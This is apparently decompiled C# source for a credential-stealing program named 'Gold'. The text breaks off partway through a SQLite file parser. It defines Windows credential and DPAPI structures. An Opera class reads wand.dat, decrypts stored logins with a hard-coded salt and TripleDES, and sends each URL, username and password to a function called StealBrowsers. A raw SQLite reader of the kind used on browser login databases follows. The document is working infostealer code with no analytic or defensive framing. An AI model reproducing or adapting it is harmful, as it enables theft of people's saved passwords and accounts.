using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Gold.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Gold;

[StandardModule]
internal sealed class Gold
{
	private struct CREDENTIAL
	{
		public IntPtr dwFlags;

		public IntPtr dwType;

		public IntPtr lpstrTargetName;

		public IntPtr lpstrComment;

		public FILETIME ftLastWritten;

		public IntPtr dwCredentialBlobSize;

		public IntPtr lpbCredentialBlob;

		public IntPtr dwPersist;

		public IntPtr dwAttributeCount;

		public IntPtr lpAttributes;

		public IntPtr lpstrTargetAlias;

		public IntPtr lpUserName;
	}

	private struct DATA_BLOB
	{
		public IntPtr cbData;

		public IntPtr pbData;
	}

	public class Opera
	{
		private static byte[] opera_salt = new byte[11]
		{
			131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
			255
		};

		private static byte[] key_size = new byte[4] { 0, 0, 0, 8 };

		private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		public string DOutput;

		private int c;

		private int c1;

		private int c2;

		private bool firstrun;

		private string ReturnValue;

		private string sUrlTemp;

		private string sUserTemp;

		private string sPassTemp;

		private string[] sUrl;

		private string[] sUser;

		private string[] sPass;

		private int lasturl;

		private bool ftp;

		private string[] Lines;

		private string[] LoginData;

		public Opera()
		{
			c = 0;
			c1 = 0;
			c2 = 0;
			firstrun = true;
			sUrl = new string[1001];
			sUser = new string[1001];
			sPass = new string[1001];
			lasturl = 0;
			ftp = false;
			LoginData = new string[3001];
		}

		public object GetOpera()
		{
			if (File.Exists(path + "\\Opera\\Opera\\wand.dat"))
			{
				path += "\\Opera\\Opera\\wand.dat";
				version2();
			}
			else if (File.Exists(path + "\\Opera\\Opera\\profile\\wand.dat"))
			{
				path += "\\Opera\\Opera\\profile\\wand.dat";
				version2();
			}
			return LoginData;
		}

		private void version2()
		{
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(path);
					int num = 0;
					int num2 = array.Length - 5;
					for (int i = 0; i <= num2; i++)
					{
						if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
						{
							num = array[i + 15];
							byte[] array2 = new byte[8];
							byte[] array3 = new byte[num - 1 + 1];
							Array.Copy(array, i + 4, array2, 0, array2.Length);
							Array.Copy(array, i + 16, array3, 0, array3.Length);
							DOutput = Conversions.ToString(Operators.AddObject((object)DOutput, Operators.ConcatenateObject(decrypt2_method(array2, array3), (object)"\r\n")));
							i += 11 + num;
						}
					}
					Lines = DOutput.Split(new char[1] { Conversions.ToChar(Environment.NewLine) });
					int num3 = 0;
					do
					{
						Lines[num3] = null;
						num3++;
					}
					while (num3 <= 3);
					int num4 = Lines.Length - 1;
					for (int j = 0; j <= num4; j++)
					{
						sUrlTemp = null;
						sUserTemp = null;
						sPassTemp = null;
						c = 0;
						try
						{
							if (!Lines[j].Contains("http://") && !Lines[j].Contains("https://") && !Lines[j].Contains("ftp://"))
							{
								if (ftp)
								{
									if (j - lasturl == 1 || j - lasturl == 2)
									{
										try
										{
											int num5 = Lines[j].Length - 1;
											for (int k = 0; k <= num5; k++)
											{
												if (Lines[j][k - c] > '\u007f')
												{
													Lines[j] = Lines[j].Remove(k - c, 1);
													c++;
												}
											}
											if (j - lasturl == 1)
											{
												sUserTemp = Lines[j];
											}
											else if (j - lasturl == 2)
											{
												sPassTemp = Lines[j];
												c1++;
												ftp = false;
											}
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
										}
									}
								}
								else if (lasturl != 0 && (j == lasturl + 2 || j == lasturl + 4))
								{
									try
									{
										int num6 = Lines[j].Length - 1;
										for (int l = 0; l <= num6; l++)
										{
											if (Lines[j][l - c] > '\u007f')
											{
												Lines[j] = Lines[j].Remove(l - c, 1);
												c++;
											}
										}
										if (j == lasturl + 2)
										{
											sUserTemp = Lines[j];
										}
										else if (j == lasturl + 4)
										{
											sPassTemp = Lines[j];
										}
									}
									catch (Exception projectError2)
									{
										ProjectData.SetProjectError(projectError2);
										ProjectData.ClearProjectError();
									}
								}
							}
							else if (j != 0)
							{
								try
								{
									int num7 = Lines[j].Length - 1;
									for (int m = 0; m <= num7; m++)
									{
										if (Lines[j][m - c] > '\u007f')
										{
											Lines[j] = Lines[j].Remove(m - c, 1);
											c++;
										}
									}
									if (j - lasturl == 1)
									{
										sUrlTemp = Lines[j];
									}
									else if (j - lasturl == 2)
									{
										sUrlTemp = Lines[j];
									}
									if (Lines[j].Contains("ftp://"))
									{
										sUrlTemp = Lines[j];
									}
									lasturl = j;
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						try
						{
							if (Operators.CompareString(sUrlTemp, (string)null, false) != 0)
							{
								sUrlTemp = sUrlTemp.Replace("\n", "");
								sUrl[c1] = sUrlTemp;
							}
							if (Operators.CompareString(sUserTemp, (string)null, false) != 0)
							{
								sUserTemp = sUserTemp.Replace("\n", "");
								sUser[c1] = sUserTemp;
							}
							if (Operators.CompareString(sPassTemp, (string)null, false) != 0)
							{
								try
								{
									sPassTemp = sPassTemp.Replace("\n", "");
									sPass[c1] = sPassTemp;
									StealBrowsers("Opera", sUrl[c1], sUser[c1], sPass[c1]);
									c1++;
								}
								catch (Exception projectError5)
								{
									ProjectData.SetProjectError(projectError5);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
				int num8 = sUrl.Length - 1;
				for (int n = 0; n <= num8 && Operators.CompareString(sUrl[n], "", false) != 0; n++)
				{
					LoginData[c2] = sUrl[n];
					LoginData[c2 + 1] = sUser[n];
					LoginData[c2 + 2] = sPass[n];
					c2 += 3;
				}
			}
		}

		public object decrypt2_method(byte[] key, byte[] encrypt_data)
		{
			checked
			{
				try
				{
					MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
					mD5CryptoServiceProvider.Initialize();
					byte[] array = new byte[opera_salt.Length + (key.Length - 1) + 1];
					Array.Copy(opera_salt, array, opera_salt.Length);
					Array.Copy(key, 0, array, opera_salt.Length, key.Length);
					byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
					array = new byte[array2.Length + opera_salt.Length + (key.Length - 1) + 1];
					Array.Copy(array2, array, array2.Length);
					Array.Copy(opera_salt, 0, array, array2.Length, opera_salt.Length);
					Array.Copy(key, 0, array, array2.Length + opera_salt.Length, key.Length);
					byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
					TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
					tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
					tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
					byte[] array3 = new byte[24];
					byte[] array4 = new byte[8];
					Array.Copy(array2, array3, array2.Length);
					Array.Copy(sourceArray, 0, array3, array2.Length, 8);
					Array.Copy(sourceArray, 8, array4, 0, 8);
					tripleDESCryptoServiceProvider.Key = array3;
					tripleDESCryptoServiceProvider.IV = array4;
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					byte[] bytes = cryptoTransform.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length);
					return Encoding.Unicode.GetString(bytes);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					object result = "";
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}

	[Flags]
	public enum CryptProtectPromptFlags
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public CryptProtectPromptFlags dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	public class SQLiteBase
	{
		public enum SQLiteDataTypes
		{
			INT = 1,
			FLOAT,
			TEXT,
			BLOB,
			NULL
		}

		private const int SQL_OK = 0;

		private const int SQL_ROW = 100;

		private const int SQL_DONE = 101;

		private IntPtr database;

		[DllImport("kernel32")]
		private static extern IntPtr HeapAlloc(IntPtr heap, uint flags, uint bytes);

		[DllImport("kernel32")]
		private static extern IntPtr GetProcessHeap();

		[DllImport("kernel32")]
		private static extern int lstrlen(IntPtr str);

		[DllImport("sqlite3")]
		private static extern int sqlite3_open(IntPtr fileName, ref IntPtr database);

		[DllImport("sqlite3")]
		private static extern int sqlite3_close(IntPtr database);

		[DllImport("sqlite3")]
		private static extern int sqlite3_exec(IntPtr database, IntPtr query, IntPtr callback, IntPtr arguments, ref IntPtr error);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_errmsg(IntPtr database);

		[DllImport("sqlite3")]
		private static extern int sqlite3_prepare_v2(IntPtr database, IntPtr query, int length, ref IntPtr statement, ref IntPtr tail);

		[DllImport("sqlite3")]
		private static extern int sqlite3_step(IntPtr statement);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_count(IntPtr statement);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_table_name(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern int sqlite3_finalize(IntPtr handle);

		public SQLiteBase()
		{
			database = IntPtr.Zero;
		}

		public SQLiteBase(string baseName)
		{
			OpenDatabase(baseName);
		}

		public void OpenDatabase(string baseName)
		{
			if (sqlite3_open(StringToPointer(baseName), ref database) != 0)
			{
				database = IntPtr.Zero;
				throw new Exception("Error with opening database " + baseName + "!");
			}
		}

		public void CloseDatabase()
		{
			if (database != IntPtr.Zero)
			{
				sqlite3_close(database);
			}
		}

		public ArrayList GetTables()
		{
			string query = "SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1";
			DataTable dataTable = ExecuteQuery(query);
			ArrayList arrayList = new ArrayList();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = dataTable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					arrayList.Add(dataRow.ItemArray[0]!.ToString());
				}
				return arrayList;
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public void ExecuteNonQuery(string query)
		{
			IntPtr error = default(IntPtr);
			sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, ref error);
			if (error != IntPtr.Zero)
			{
				throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + PointerToString(sqlite3_errmsg(error)));
			}
		}

		public DataTable ExecuteQuery(string query)
		{
			IntPtr statement = default(IntPtr);
			IntPtr tail = default(IntPtr);
			sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), ref statement, ref tail);
			DataTable table = new DataTable();
			for (int num = ReadFirstRow(statement, ref table); num == 100; num = ReadNextRow(statement, ref table))
			{
			}
			sqlite3_finalize(statement);
			return table;
		}

		private int ReadFirstRow(IntPtr statement, ref DataTable table)
		{
			table = new DataTable("resultTable");
			int num = sqlite3_step(statement);
			checked
			{
				if (num == 100)
				{
					int num2 = sqlite3_column_count(statement);
					string text = "";
					int num3 = 0;
					object[] array = new object[num2 - 1 + 1];
					int num4 = num2 - 1;
					for (int i = 0; i <= num4; i++)
					{
						text = PointerToString(sqlite3_column_name(statement, i));
						switch (sqlite3_column_type(statement, i))
						{
						default:
							table.Columns.Add(text, Type.GetType("System.String"));
							array[i] = "";
							break;
						case 1:
							table.Columns.Add(text, Type.GetType("System.Int32"));
							array[i] = sqlite3_column_int(statement, i);
							break;
						case 2:
							table.Columns.Add(text, Type.GetType("System.Single"));
							array[i] = sqlite3_column_double(statement, i);
							break;
						case 3:
							table.Columns.Add(text, Type.GetType("System.String"));
							array[i] = PointerToString(sqlite3_column_text(statement, i));
							break;
						case 4:
							table.Columns.Add(text, Type.GetType("System.String"));
							array[i] = PointerToString(sqlite3_column_blob(statement, i));
							break;
						}
					}
					table.Rows.Add(array);
				}
				return sqlite3_step(statement);
			}
		}

		private int ReadNextRow(IntPtr statement, ref DataTable table)
		{
			int num = sqlite3_column_count(statement);
			int num2 = 0;
			checked
			{
				object[] array = new object[num - 1 + 1];
				int num3 = num - 1;
				for (int i = 0; i <= num3; i++)
				{
					switch (sqlite3_column_type(statement, i))
					{
					default:
						array[i] = "";
						break;
					case 1:
						array[i] = sqlite3_column_int(statement, i);
						break;
					case 2:
						array[i] = sqlite3_column_double(statement, i);
						break;
					case 3:
						array[i] = PointerToString(sqlite3_column_text(statement, i));
						break;
					case 4:
						array[i] = PointerToString(sqlite3_column_blob(statement, i));
						break;
					}
				}
				table.Rows.Add(array);
				return sqlite3_step(statement);
			}
		}

		private IntPtr StringToPointer(string str)
		{
			if (str == null)
			{
				return IntPtr.Zero;
			}
			Encoding uTF = Encoding.UTF8;
			byte[] bytes = uTF.GetBytes(str);
			uint bytes2 = checked((uint)(bytes.Length + 1));
			IntPtr intPtr = HeapAlloc(GetProcessHeap(), 0u, bytes2);
			Marshal.Copy(bytes, 0, intPtr, bytes.Length);
			Marshal.WriteByte(intPtr, bytes.Length, 0);
			return intPtr;
		}

		private string PointerToString(IntPtr ptr)
		{
			if (ptr == IntPtr.Zero)
			{
				return null;
			}
			Encoding uTF = Encoding.UTF8;
			int pointerLenght = GetPointerLenght(ptr);
			byte[] array = new byte[checked(pointerLenght - 1 + 1)];
			Marshal.Copy(ptr, array, 0, pointerLenght);
			return uTF.GetString(array, 0, pointerLenght);
		}

		private int GetPointerLenght(IntPtr ptr)
		{
			if (ptr == IntPtr.Zero)
			{
				return 0;
			}
			return lstrlen(ptr);
		}
	}

	public class SQLiteHandler
	{
		private struct record_header_field
		{
			public long size;

			public long type;
		}

		private struct table_entry
		{
			public long row_id;

			public string[] content;
		}

		private struct sqlite_master_entry
		{
			public long row_id;

			public string item_type;

			public string item_name;

			public string astable_name;

			public long root_num;

			public string sql_statement;
		}

		private byte[] db_bytes;

		private ushort page_size;

		private ulong encoding;

		private sqlite_master_entry[] master_table_entries;

		private byte[] SQLDataTypeSize;

		private table_entry[] table_entries;

		private string[] field_names;

		private int GVL(int startIndex)
		{
			if (startIndex > db_bytes.Length)
			{
				return 0;
			}
			checked
			{
				int num = startIndex + 8;
				int num2 = startIndex;
				while (true)
				{
					if (num2 <= num)
					{
						if (num2 <= db_bytes.Length - 1)
						{
							if ((db_bytes[num2] & 0x80) != 128)
							{
								break;
							}
							num2++;
							continue;
						}
						return 0;
					}
					return startIndex + 8;
				}
				return num2;
			}
		}

		private long CVL(int startIndex, int endIndex)
		{
			checked
			{
				endIndex++;
				byte[] array = new byte[8];
				int num = endIndex - startIndex;
				bool flag = false;
				if (unchecked(num == 0 || num > 9))
				{
					return 0L;
				}
				switch (num)
				{
				case 1:
					array[0] = (byte)(db_bytes[startIndex] & 0x7F);
					return BitConverter.ToInt64(array, 0);
				case 9:
					flag = true;
					break;
				}
				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = db_bytes[endIndex - 1];
					endIndex--;
					num4 = 1;
				}
				for (int i = endIndex - 1; i >= startIndex; i += -1)
				{
					if (i - 1 >= startIndex)
					{
						array[num4] = (byte)unchecked(((byte)((uint)db_bytes[i] >> (checked(num2 - 1) & 7)) & (255 >> num2)) | (byte)(db_bytes[checked(i - 1)] << (num3 & 7)));
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)(unchecked((byte)((uint)db_bytes[i] >> (checked(num2 - 1) & 7))) & (255 >> num2));
					}
				}
				return BitConverter.ToInt64(array, 0);
			}
		}

		private bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		private ulong ConvertToInteger(int startIndex, int Size)
		{
			if (Size > 8 || Size == 0)
			{
				return 0uL;
			}
			ulong num = 0uL;
			checked
			{
				int num2 = Size - 1;
				for (int i = 0; i <= num2; i++)
				{
					num = (num << 8) | db_bytes[startIndex + i];
				}
				return num;
			}
		}

		private void ReadMasterTable(ulong Offset)
		{
			checked
			{
				if (db_bytes[(int)Offset] == 13)
				{
					ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
					int num2 = 0;
					if (master_table_entries != null)
					{
						num2 = master_table_entries.Length;
						master_table_entries = (sqlite_master_entry[])Utils.CopyArray((Array)master_table_entries, (Array)new sqlite_master_entry[master_table_entries.Length + unchecked((int)num) + 1]);
					}
					else
					{
						master_table_entries = new sqlite_master_entry[unchecked((int)num) + 1];
					}
					int num3 = num;
					for (int i = 0; i <= num3; i++)
					{
						ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(8L)), new decimal(i * 2))), 2);
						if (decimal.Compare(new decimal(Offset), new decimal(100L)) != 0)
						{
							num4 += Offset;
						}
						int num5 = GVL((int)num4);
						CVL((int)num4, num5);
						int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
						master_table_entries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
						num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
						num5 = GVL((int)num4);
						num6 = num5;
						long value = CVL((int)num4, num5);
						long[] array = new long[5];
						int num7 = 0;
						do
						{
							num5 = num6 + 1;
							num6 = GVL(num5);
							array[num7] = CVL(num5, num6);
							if (array[num7] <= 9L)
							{
								array[num7] = SQLDataTypeSize[(int)array[num7]];
							}
							else if (IsOdd(array[num7]))
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
							}
							else
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
							}
							num7++;
						}
						while (num7 <= 4);
						if (decimal.Compare(new decimal(encoding), 1m) == 0)
						{
							master_table_entries[num2 + i].item_type = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
						}
						else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
						{
							master_table_entries[num2 + i].item_type = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
						}
						else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
						{
							master_table_entries[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
						}
						if (decimal.Compare(new decimal(encoding), 1m) == 0)
						{
							master_table_entries[num2 + i].item_name = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
						}
						else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
						{
							master_table_entries[num2 + i].item_name = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
						}
						else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
						{
							master_table_entries[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
						}
						master_table_entries[num2 + i].root_num = (long)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
						if (decimal.Compare(new decimal(encoding), 1m) == 0)
						{
							master_table_entries[num2 + i].sql_statement = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						}
						else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
						{
							master_table_entries[num2 + i].sql_statement = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						}
						else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
						{
							master_table_entries[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						}
					}
				}
				else
				{
					if (db_bytes[(int)Offset] != 5)
					{
						return;
					}
					ushort num8 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
					int num9 = num8;
					for (int j = 0; j <= num9; j++)
					{
						ushort num10 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(12L)), new decimal(j * 2))), 2);
						if (decimal.Compare(new decimal(Offset), new decimal(100L)) == 0)
						{
							ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(num10, 4)), 1m), new decimal(page_size))));
						}
						else
						{
							ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num10), 4)), 1m), new decimal(page_size))));
						}
					}
					ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(8L))), 4)), 1m), new decimal(page_size))));
				}
			}
		}

		private bool ReadTableFromOffset(ulong Offset)
		{
			checked
			{
				if (db_bytes[(int)Offset] == 13)
				{
					ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
					int num2 = 0;
					if (table_entries != null)
					{
						num2 = table_entries.Length;
						table_entries = (table_entry[])Utils.CopyArray((Array)table_entries, (Array)new table_entry[table_entries.Length + unchecked((int)num) + 1]);
					}
					else
					{
						table_entries = new table_entry[unchecked((int)num) + 1];
					}
					int num3 = num;
					for (int i = 0; i <= num3; i++)
					{
						ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(8L)), new decimal(i * 2))), 2);
						if (decimal.Compare(new decimal(Offset), new decimal(100L)) != 0)
						{
							num4 += Offset;
						}
						int num5 = GVL((int)num4);
						CVL((int)num4, num5);
						int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
						table_entries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
						num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
						num5 = GVL((int)num4);
						num6 = num5;
						long num7 = CVL((int)num4, num5);
						record_header_field[] array = null;
						long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
						int num9 = 0;
						while (num8 < num7)
						{
							array = (record_header_field[])Utils.CopyArray((Array)array, (Array)new record_header_field[num9 + 1]);
							num5 = num6 + 1;
							num6 = GVL(num5);
							array[num9].type = CVL(num5, num6);
							if (array[num9].type > 9L)
							{
								if (IsOdd(array[num9].type))
								{
									array[num9].size = (long)Math.Round((double)(array[num9].type - 13L) / 2.0);
								}
								else
								{
									array[num9].size = (long)Math.Round((double)(array[num9].type - 12L) / 2.0);
								}
							}
							else
							{
								array[num9].size = SQLDataTypeSize[(int)array[num9].type];
							}
							num8 = num8 + (num6 - num5) + 1L;
							num9++;
						}
						table_entries[num2 + i].content = new string[array.Length - 1 + 1];
						int num10 = 0;
						int num11 = array.Length - 1;
						for (int j = 0; j <= num11; j++)
						{
							if (array[j].type > 9L)
							{
								if (!IsOdd(array[j].type))
								{
									if (decimal.Compare(new decimal(encoding), 1m) == 0)
									{
										table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
									}
									else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
									{
										table_entries[num2 + i].content[j] = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
									}
									else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
									{
										table_entries[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
									}
								}
								else
								{
									table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
							}
							else
							{
								table_entries[num2 + i].content[j] = Conversions.ToString(ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size));
							}
							num10 = (int)(num10 + array[j].size);
						}
					}
				}
				else if (db_bytes[(int)Offset] == 5)
				{
					ushort num12 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
					int num13 = num12;
					for (int k = 0; k <= num13; k++)
					{
						ushort num14 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(12L)), new decimal(k * 2))), 2);
						ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num14), 4)), 1m), new decimal(page_size))));
					}
					ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(8L))), 4)), 1m), new decimal(page_size))));
				}
				return true;
			}
		}

		public bool ReadTable(string TableName)
		{
			int num = -1;
			int num2 = master_table_entries.Length;
			checked
			{
				for (int i = 0; i <= num2; i++)
				{
					if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					return false;
				}
				string[] array = master_table_entries[num].sql_statement.Substring(master_table_entries[num].sql_statement.IndexOf("(") + 1).Split(new char[1] { ',' });
				int num3 = array.Length - 1;
				for (int j = 0; j <= num3; j++)
				{
					array[j] = Strings.LTrim(array[j]);
					int num4 = array[j].IndexOf(" ");
					if (num4 > 0)
					{
						array[j] = array[j].Substring(0, num4);
					}
					if (array[j].IndexOf("UNIQUE") == 0)
					{
						break;
					}
					field_names = (string[])Utils.CopyArray((Array)field_names, (Array)new string[j + 1]);
					field_names[j] = array[j];
				}
				return ReadTableFromOffset((ulong)((master_table_entries[num].root_num - 1L) * unchecked((long)page_size)));
			}
		}

		public int GetRowCount()
		{
			return table_entries.Length;
		}

		public string GetValue(int row_num, int field)
		{
			if (row_num >= table_entries.Length)
			{
				return null;
			}
			if (field >= table_entries[row_num].content.Length)
			{
				return null;
			}
			return table_entries[row_num].content[field];
		}

		public string GetValue(int row_num, string field)
		{
			int num = -1;
			int num2 = field_names.Length;
			for (int i = 0; i <= num2; i = checked(i + 1))
			{
				if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return null;
			}
			return GetValue(row_num, num);
		}

		public string[] GetTableNames()
		{
			string[] array = null;
			int num = 0;
			checked
			{
				int num2 = master_table_entries.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
